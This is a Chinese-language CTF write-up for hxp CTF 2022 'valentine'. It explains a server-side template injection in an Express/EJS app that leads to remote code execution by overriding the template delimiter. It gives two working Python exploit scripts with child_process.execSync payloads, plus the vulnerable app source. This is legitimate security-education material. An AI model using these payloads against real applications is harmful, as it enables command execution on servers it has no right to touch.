#RCE 

原文：[hxp | hxp CTF 2022: valentine](https://hxp.io/blog/101/hxp-CTF-2022-valentine/)

默认的 NodeJS RCE，它读取/flag：

```html
<.- global.process.mainModule.constructor._load(`child_process`).execSync(`/readflag`).toString() .>
```

在 Dockerfile 中，节点环境设置为生产环境。

```Dockerfile
ENV NODE_ENV=production
```

这会导致快速缓存视图。

```javascript
if (env === 'production') {
  this.enable('view cache');
}
```

由于 POST 请求直接重定向到没有分隔符的模板，因此将缓存默认分隔符`%`，以后无法覆盖。

但可以禁止重定向：

- Python：`requests.port(..., allow_redirects=False)`
- Firefox: set `network.http.redirection-limit` to `1` in `about:config`

如果随后使用`delimiter=.`访问站点，则将在模板中使用新的`delimiter`。


## pwn.py

```python
import requests
import re

HOST = "TODO"
PORT = TODO

# write template
r = requests.post(
    f"http://{HOST}:{PORT}/template",
    data={
        "tmpl": """<.- global.process.mainModule.constructor._load(`child_process`).execSync(`/readflag`).toString() .>"""
    },
    allow_redirects=False,
)

# change delimiter
m = re.search(r"Redirecting to /(?P<uuid>.*)?name=", r.text)
r = requests.get(f"http://{HOST}:{PORT}/{m.group('uuid')}?name=a&delimiter=.")
m = re.search(r"hxp\{[^}]+\}", r.text)
print(m.group(0))

```
另一种
```python
import requests

url = ""
tmpl = (
    "flag: <$= process.mainModule.require('child_process').execSync('../readflag') $>"
)
r = requests.post(
    url + "/template", data={"tmpl": tmpl, "name": "gork"}, allow_redirects=False
)
redirect = r.headers["location"]

r = requests.get(url + redirect + "&delimiter=$")
print(r.text)

```


个人理解

app.py
```python
var express = require('express');
var bodyParser = require('body-parser')
const crypto = require("crypto");
var path = require('path');
const fs = require('fs');

var app = express();
viewsFolder = path.join(__dirname, 'views');

if (!fs.existsSync(viewsFolder)) {
  fs.mkdirSync(viewsFolder);
}

app.set('views', viewsFolder);
app.set('view engine', 'ejs');

app.use(bodyParser.urlencoded({ extended: false }))

app.post('/template', function (req, res) {
  let tmpl = req.body.tmpl;
  let i = -1;
  while ((i = tmpl.indexOf("<%", i + 1)) >= 0) {
    if (tmpl.substring(i, i + 11) !== "<%= name %>") {
      res.status(400).send({ message: "Only '<%= name %>' is allowed." });
      return;
    }
  }
  let uuid;
  do {
    uuid = crypto.randomUUID();
  } while (fs.existsSync(`views/${uuid}.ejs`))

  try {
    fs.writeFileSync(`views/${uuid}.ejs`, tmpl);
  } catch (err) {
    res.status(500).send("Failed to write Valentine's card");
    return;
  }
  let name = req.body.name ?? '';
  return res.redirect(`/${uuid}?name=${name}`);
});

app.get('/:template', function (req, res) {
  let query = req.query;
  let template = req.params.template
  if (!/^[0-9A-F]{8}-[0-9A-F]{4}-[4][0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i.test(template)) {
    res.status(400).send("Not a valid card id")
    return;
  }
  if (!fs.existsSync(`views/${template}.ejs`)) {
    res.status(400).send('Valentine\'s card does not exist')
    return;
  }
  if (!query['name']) {
    query['name'] = ''
  }
  return res.render(template, query);
});

app.get('/', function (req, res) {
  return res.sendFile('./index.html', { root: __dirname });
});

app.listen(process.env.PORT || 3000);
```

首先， /template 传递的tml会根据 `<%` 匹配 <%= name %>，上面的两个脚本是不同的方式

一个是在开始就修改delimiter,另一个是重定向时修改delimiter。

至于这个命令

```javascript
global.process.mainModule.constructor._load(`child_process`).execSync(`/readflag`).toString()
```

是用到了原型链以及nodejs child_process 模块相关的内容